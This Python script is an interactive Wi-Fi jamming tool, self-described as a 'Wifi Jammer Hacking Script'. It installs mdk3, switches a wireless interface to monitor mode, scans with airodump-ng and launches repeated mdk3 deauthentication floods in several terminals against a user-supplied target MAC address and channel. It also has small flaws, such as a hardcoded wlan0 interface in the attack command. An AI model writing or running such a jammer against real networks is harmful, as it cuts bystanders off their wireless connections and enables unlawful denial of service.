import os
import sys
import subprocess
from colorama import Fore, Style

def run_wifi_jammer():
    def print_banner():
        """Displays ASCII art of the highest caliber."""
        print(f"{Fore.GREEN}  .     {Fore.LIGHTBLACK_EX}     {Style.RESET_ALL}{Fore.GREEN}     .    {Style.RESET_ALL}")
        print(f"{Fore.GREEN}.´  ·  .{Fore.LIGHTBLACK_EX}     {Style.RESET_ALL}{Fore.GREEN}.  ·  `.  {Fore.GREEN}WiFi Jammer{Style.RESET_ALL}")
        print(f"{Fore.GREEN}:  :  : {Fore.LIGHTBLACK_EX} (¯) {Style.RESET_ALL}{Fore.GREEN} :  :  :  {Style.RESET_ALL}")
        print(f"{Fore.GREEN}`.  ·  `{Fore.LIGHTBLACK_EX} /¯\ {Style.RESET_ALL}{Fore.GREEN}´  ·  .´  {Style.RESET_ALL}")
        print(f"{Fore.GREEN}  `     {Fore.LIGHTBLACK_EX}/¯¯¯\\{Style.RESET_ALL}{Fore.GREEN}     ´    {Style.RESET_ALL}")
        print()
    try:

        def check_and_install_mdk3():
            
            print_banner()
            print(f"{Fore.YELLOW}Checking for mdk3...{Style.RESET_ALL}")
            try:
                result = subprocess.run(
                    ["which", "mdk3"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                if result.returncode != 0 or not result.stdout.strip():
                    print(f"{Fore.RED}mdk3 is not installed.{Style.RESET_ALL}")
                    install = (
                        input(
                            f"{Fore.YELLOW}Do you want to install mdk3? (yes/no): {Style.RESET_ALL}"
                        )
                        .strip()
                        .lower()
                    )
                    if install in ["yes", "y"]:
                        print(
                            f"{Fore.YELLOW}Updating and upgrading system...{Style.RESET_ALL}"
                        )
                        subprocess.run(["sudo", "apt-get", "update"], check=True)
                        subprocess.run(["sudo", "apt-get", "upgrade", "-y"], check=True)
                        print(f"{Fore.YELLOW}Installing mdk3...{Style.RESET_ALL}")
                        subprocess.run(
                            ["sudo", "apt-get", "install", "-y", "mdk3"], check=True
                        )
                        result = subprocess.run(
                            ["mdk3", "--version"],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                        )
                        if result.returncode == 0:
                            print(
                                f"{Fore.GREEN}mdk3 version: {result.stdout.decode().strip()}{Style.RESET_ALL}"
                            )
                        else:
                            print(
                                f"{Fore.RED}Failed to check mdk3 version.{Style.RESET_ALL}"
                            )
                    else:
                        print(
                            f"{Fore.RED}Exiting as mdk3 is required.{Style.RESET_ALL}"
                        )
                        sys.exit(1)
                else:
                    print(f"{Fore.GREEN}mdk3 is already installed.{Style.RESET_ALL}")
            except subprocess.CalledProcessError as e:
                print(
                    f"{Fore.RED}Error checking or installing mdk3: {e}{Style.RESET_ALL}"
                )

        def get_network_interface():
            print(f"{Fore.GREEN}Displaying network interfaces...{Style.RESET_ALL}")
            subprocess.run(["iwconfig"], check=True)

            interface = input(
                f"{Fore.GREEN}Enter the network interface to use (e.g., wlan0): {Style.RESET_ALL}"
            ).strip()

            if not interface:
                print(f"{Fore.RED}Invalid interface name.{Style.RESET_ALL}")
                sys.exit(1)

            def is_monitor_mode(interface):
                result = subprocess.run(
                    ["iwconfig", interface],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                if result.returncode == 0:
                    output = result.stdout.decode()
                    if "Mode:Monitor" in output:
                        return True
                return False

            def set_monitor_mode(interface):
                print(
                    f"{Fore.YELLOW}Switching {interface} to monitor mode...{Style.RESET_ALL}"
                )
                try:
                    subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
                    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
                    subprocess.run(
                        ["sudo", "airmon-ng", "start", interface], check=True
                    )
                    subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
                    print(
                        f"{Fore.GREEN}{interface} is now in monitor mode.{Style.RESET_ALL}"
                    )
                except subprocess.CalledProcessError as e:
                    print(f"{Fore.RED}Error setting monitor mode: {e}{Style.RESET_ALL}")
                    sys.exit(1)

            if not is_monitor_mode(interface):
                set_monitor_mode(interface)

            return interface

        def select_frequency(interface):
            while True:
                print(f"{Fore.GREEN}Select Frequency Band for {interface}:")
                print(f"(1) 2.4GHz")
                print(f"(2) 5GHz")
                choice = input(
                    f"{Fore.GREEN}Enter your choice (1 or 2): {Style.RESET_ALL}"
                ).strip()

                if choice == "1":
                    print(f"{Fore.GREEN}You selected 2.4GHz.{Style.RESET_ALL}")
                    return "2.4GHz"

                elif choice == "2":
                    print(f"{Fore.YELLOW}You selected 5GHz.{Style.RESET_ALL}")
                    return "5GHz"

                else:
                    print(
                        f"{Fore.RED}Invalid choice. Please select 1 or 2.{Style.RESET_ALL}"
                    )

        def run_wifi_tools(interface, frequency_choice):
            print(f"{Fore.YELLOW}Starting airmon-ng on {interface}...{Style.RESET_ALL}")
            subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
            print(
                f"{Fore.GREEN}Displaying updated network interfaces...{Style.RESET_ALL}"
            )
            subprocess.run(["ifconfig"], check=True)

            if frequency_choice == "5GHz":
                print(f"{Fore.YELLOW}Running airodump-ng on 5GHz...{Style.RESET_ALL}")
                subprocess.Popen(
                    ["xterm", "-e", f"sudo airodump-ng --band a {interface}; exec bash"]
                )
                print(
                    f"{Fore.YELLOW}Now entering MAC address and channel input for 5GHz...{Style.RESET_ALL}"
                )
                handle_blacklist_whitelist()
            elif frequency_choice == "2.4GHz":
                print(
                    f"{Fore.GREEN}You can proceed with 2.4GHz operations now.{Style.RESET_ALL}"
                )

        def handle_blacklist_whitelist():
            while True:
                macid_raw = (
                    input(f"{Fore.GREEN}Enter a target MAC address : {Style.RESET_ALL}")
                    .strip()
                    .lower()
                )

                # Validate input length
                if len(macid_raw) != 12:
                    print(
                        f"{Fore.RED}Invalid MAC address format. Please enter exactly 12 hexadecimal characters.{Style.RESET_ALL}"
                    )
                    continue

                macid = ":".join(
                    macid_raw[i : i + 2].upper() for i in range(0, len(macid_raw), 2)
                )

                print(f"{Fore.GREEN}Target MAC address: {macid}{Style.RESET_ALL}")

                ch = input(
                    f"{Fore.GREEN}Enter Target Channel (CH): {Style.RESET_ALL}"
                ).strip()
                while not ch.isdigit():
                    print(
                        f"{Fore.RED}Invalid channel. Please enter a numeric value.{Style.RESET_ALL}"
                    )
                    ch = input(
                        f"{Fore.GREEN}Enter Target Channel (CH): {Style.RESET_ALL}"
                    ).strip()

                try:
                    num_terminals = int(
                        input(
                            f"{Fore.GREEN}Enter the number of terminals you want to open: {Style.RESET_ALL}"
                        ).strip()
                    )
                    if num_terminals <= 0:
                        raise ValueError
                except ValueError:
                    print(
                        f"{Fore.RED}Invalid input. Please enter a positive integer.{Style.RESET_ALL}"
                    )
                    continue

                print(
                    f"{Fore.YELLOW}Starting Your Wifi Jammer Hacking Script in {num_terminals} different terminals...{Style.RESET_ALL}"
                )

                commands = [
                    ["xterm", "-e", f"sudo mdk3 wlan0 d -c {ch} {macid}; exec bash"]
                    for _ in range(num_terminals)
                ]

                for cmd in commands:
                    subprocess.Popen(cmd)

                cont = (
                    input(
                        f"{Fore.GREEN}Do you want to enter another MAC address? (yes/no): {Style.RESET_ALL}"
                    )
                    .strip()
                    .lower()
                )
                if cont not in ["yes", "y"]:
                    break

        def runw():
            try:
                if os.geteuid() != 0:
                    print(
                        f"{Fore.RED}This script must be run as root. Exiting...{Style.RESET_ALL}"
                    )
                    sys.exit(1)
                check_and_install_mdk3()
                interface = get_network_interface()
                frequency_choice = select_frequency(interface)

                if frequency_choice:
                    run_wifi_tools(interface, frequency_choice)
                    handle_blacklist_whitelist()

            except subprocess.CalledProcessError as e:
                print(
                    f"{Fore.RED}Error running Wi-Fi tool commands: {e}{Style.RESET_ALL}"
                )

        runw()

    except KeyboardInterrupt:
        print(f"{Fore.RED}Process interrupted by user Exiting...{Style.RESET_ALL}")
        sys.exit(1)
